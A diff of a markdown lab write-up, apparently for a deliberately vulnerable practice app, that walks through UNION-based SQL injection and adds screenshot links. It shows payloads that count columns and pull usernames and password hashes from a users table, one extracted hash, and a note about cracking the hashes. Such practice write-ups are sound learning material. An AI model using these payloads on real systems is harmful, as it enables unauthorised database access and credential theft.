@@ -213,11 +213,15 @@ Now lets navigate to SQL Injection which now will show a dropdown menu.
      (Image)
 
    - Determine colums: `1' UNION SELECT 1,2-- -`
+     ![columns](./col)
   
    - Extract passwords: `1' UNION SELECT user,password FROM users-- -`
+   
    - Returns all usernames and hashes which are the passwords
+     ![hashes](./hashpass)
    - we crack the hashes, we get our passwords
-   - 
+![crackstation](./hash1)
+    
 First name: pablo
 
 Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
